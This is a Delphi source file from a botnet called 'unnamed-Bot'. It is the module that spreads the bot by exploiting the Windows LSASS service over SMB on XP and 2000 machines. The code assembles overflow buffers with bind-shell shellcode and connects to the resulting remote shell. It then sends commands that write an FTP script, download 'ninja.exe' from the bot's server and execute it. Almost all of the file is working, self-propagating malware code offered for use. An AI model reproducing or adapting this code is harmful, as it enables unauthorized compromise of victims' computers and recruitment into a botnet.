(*
        Project  : unnamed -Bot
        Author   : p0ke
        Homepage : http://unnamed.bot.nu/
        Credits  : Redlime      - Helped with coding.
                   Tzorcelan    - Helped with coding and testing spread.
                   Positron     - Coded netbios-spread orginal. I Modified it.
                                - http://positronvx.cjb.net
                   Ago          - Ported alot of c++ code from him.
                   siaze        - Inject function to memory

        Shouts   : Robb, Skäggman, #swerat, #chasenet, #undergroundkonnekt
                   xcel, Codius, KOrvEn, ZiN
        Crews    : sweRAT Crew          - http://www.swerat.com
                   chaseNet Crew        - http://www.chasenet.org
                   undergroundkonnekt   - http://undergroundkonnekt.net

        --
        This LSASS2 Exploit was ported from Phatbot (by PhaTTy) greets.
        This LSASS2 Exploit only supports WinXP exploiting

        BIG Thanks to tzor for running his honeypot. Without it
        i wouldnt be able to successfully port this exploit.
*)

Unit lsass2_spreader;

Interface

Uses
  Windows,
  Winsock,
  untFTPD,
  untCrypt,
  untGlobalDeclare,
  lsass_const;          // All shellcode/requests.

  Function LSASSRoot(szAddress: String; RootXP: Boolean; Sock: TSocket; var lerror:string): Boolean;

implementation

Procedure MemSet(Var Str: String; C: String; L: Integer);
Begin
  Str := '';
  While Length(Str) < L Do
    Str := Str + C;
End;

Function IntToStr(Const Value: Integer): String;
Var
  S: String[11];
Begin
  Str(Value, S);
  Result := S;
End;

function cryptsend(sock: tsocket; var text; len: integer; flag: integer): integer;
var
  temp  :string;
begin
  temp := crypt(string(text), c_key);
  len := length(temp);
  
  move(temp[1], text, len);
  result := send(sock, text, len, flag);
end;

Function LSASSRoot(szAddress: String; RootXP: Boolean; Sock: TSocket; var lerror:string): Boolean;
Var
  HostIPC       :String;
  HostIPC2      :Array[1..80] Of Char;
  szRecvBuf     :Array[0..1600] Of Char;
  req4u         :String;

  smbLen        :Byte;
  uncLen        :Byte;

  mkdir_buff    :String;
  strBuffer     :String;
  screq         :String;
  screq2k       :String;
  screq2k2      :String;
  Buf           :String;
  SendBuf       :String;

  I             :Integer;
  Port          :Short;
  SC            :String;
  strasm        :String;

//  Sock          :TSocket;
  Addr          :TSockAddrIn;
  outSock       :TSocket;
  WSA           :TWSAData;
  WINXPJMPCODE  :DWord;
  WIN2KJMPCODE  :DWord;
Begin
  Result := False;

  WINXPJMPCODE := $01004600;
  WINXPJMPCODE := $7515123c;
  MemSet(HostIPC, NOP, 40);
  MemSet(Req4u, NOP, Length(req4)+20);
  MemSet(strBuffer, NOP, BUFSIZE);
  MemSet(screq, NOP, BUFSIZE+Length(req7)+1500+440);
  MemSet(screq2k, NOP, 4348+4060);
  MemSet(screq2k2, NOP, 4348+4060);

  strasm := #$66#$81#$EC#$1C#$07#$FF#$E4;

//  WSAStartUP($101, WSA);

  {
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(445);
  Addr.sin_addr.S_addr := inet_addr(pChar(szAddress));

  If Connect(Sock, Addr, SizeOf(Addr)) <> 0 Then
    Exit;
  }
  lerror := 'failed to send data';

  // Send request1
  If cryptsend(Sock, Req1[1], Length(Req1), 0) < 1 Then Exit;
  If Recv(Sock, szRecvBuf[0], 1600, 0) < 1 Then Exit;

  // Send request2
  If cryptsend(Sock, Req2[1], Length(Req2), 0) < 1 Then Exit;
  If Recv(Sock, szRecvBuf[0], 1600, 0) < 1 Then Exit;

  // Send request3
  If cryptsend(Sock, Req3[1], Length(Req3), 0) < 1 Then Exit;
  If Recv(Sock, szRecvBuf[0], 1600, 0) < 1 Then Exit;

  MemSet(HostIPC, '\\\\'+szAddress+'\\ipc$', 40);

  For I := 1 To 40 Do
  Begin
    HostIPC2[I*2] := HostIPC[I];
    HostIPC2[I*2+1] := #0;
  End;

  Move(Req4[1], Req4u[1], Length(Req4));
  Move(HostIPC2[1], Req4u[48], SizeOf(HostIPC2));
  Move(Req4[87], Req4u[47+Length(HostIPC)*2], 9);

  smbLen := 52 + Length(HostIPC);
  Move(smbLen, Req4u[3], 1);

  uncLen := 9  + Length(HostIPC) * 2;
  Move(uncLen, Req4u[45], 1);

  Port := hTons(dPort) XOR Short($9999);
  Move(Port, BindShell[176], 2);

  SC := BindShell;

  If Not RootXP Then
  Begin
    MemSet(Buf, NOP, LEN);

    Move(WIN2KJMPCODE, Buf[2844], 4);
    Move(SC[1], Buf[2856], Length(SC));

    Buf[2480] := #$eb;
    Buf[2841] := #$06;
    Buf[2842] := #$eb;
    Buf[2843] := #$06;

    Move(WIN2KJMPCODE, Buf[2844], 4);
    Move(SC[1], Buf[2856], Length(SC));

    MemSet(SendBuf, NOP, (LEN+1)*2);

    For I := 1 To LEN Do
    Begin
      SendBuf[I*2] := Buf[I];
      SendBuf[I*2+1] := #0;
    End;
    SendBuf[LEN*2] := #0;
    SendBuf[LEN*2+1] := #0;

    MemSet(Screq2k,  #$31, (BUFSIZE+Length(Req7)+1500)*2);
    MemSet(Screq2k2, #$31, (BUFSIZE+Length(Req7)+1500)*2);
  End Else
  Begin
    For I := 1 To BUFSIZE Do
      strBuffer[I] := NOP;

    Move(SC[1], strBuffer[160], Length(SC));
    Move(Strasm[1], strBuffer[1980], Length(strasm));
    Move(WINXPJMPCODE, strBuffer[1964], 1);
  End;

  For I := 1 To BUFSIZE+Length(Req7)+1500 Do
    screq[I] := #$31;

  If cryptsend(Sock, req4u[1], smblen+4, 0) < 1 Then Exit;
  If Recv(Sock, szRecvBuf[0], 1600, 0) < 1 Then Exit;

  If cryptsend(Sock, req5[1], Length(req5), 0) < 1 Then Exit;
  If Recv(Sock, szRecvBuf[0], 1600, 0) < 1 Then Exit;

  If cryptsend(Sock, req6[1], Length(req6), 0) < 1 Then Exit;
  If Recv(Sock, szRecvBuf[0], 1600, 0) < 1 Then Exit;

  If Not RootXP Then
  Begin
    Move(Req8[1], screq2k[1], Length(req8));
    Move(SendBuf[1], Screq2k[Length(Req8)], (LEN+1)*2);
    Move(Req9[1], Screq2k2[1], Length(Req9));
    Move(SendBuf[4348-Length(req8)+1], Screq2k2[Length(req8)], (LEN+1)*2-4348);
    Move(Shit3[1], Screq2k2[Length(req9)+(LEN+1)*2-4348-Length(Req8)+1+206], Length(Shit3));

    If cryptsend(Sock, Screq2k[1], 4348, 0) < 1 Then Exit;
    If Recv(Sock, szRecvBuf[0], 1600, 0) < 1 Then Exit;
    If cryptsend(Sock, Screq2k2[1], 4060, 0) < 1 Then Exit;
  End Else
  Begin
    Move(Req7[1], Screq[1], Length(req7));
    Move(strBuffer[1], screq[Length(Req7)], BUFSIZE);
    Move(Shit1[1], Screq[Length(Req7)+BUFSIZE], 9*16);

    screq[BUFSIZE+Length(req7)+1500-304-1] := #0;

    If cryptsend(Sock, Screq[1], BUFSIZE+Length(Req7)+1500-304, 0) < 1 Then Exit;
  End;

  Sleep(10000);

  Addr.sin_port := hTons(44445);
  outSock := Socket(AF_INET, SOCK_STREAM, 0);
  If Connect(outSock, Addr, SizeOf(Addr)) <> 0 Then
  begin
    lerror := 'failed to open shell';
    exit;
  end;

    mkdir_buff := 'echo open ' + ftp_mainip + ' ' + IntToStr(ftp_port) + ' > bla.txt'#10+
                  'echo user ' + ftp_user + ' ' + ftp_pass + ' >> bla.txt'#10+
                  'echo binary >> bla.txt'#10+
                  'echo get ninja.exe >> bla.txt'#10+
                  'echo quit >> bla.txt'#10+
                  'ftp.exe -n -s:bla.txt'#10+
                  'ninja.exe'#10;

  If Recv(outSock, szRecvBuf[0], 1600, 0) < 1 Then Exit;
  Sleep(500);
  If send(outSock, mkdir_buff[1], Length(mkdir_buff), 0) < 1 Then Exit;

  Result := True;
  CloseSocket(outSock);
//  CloseSocket(Sock);

//  WSACleanUP();

End;

end.
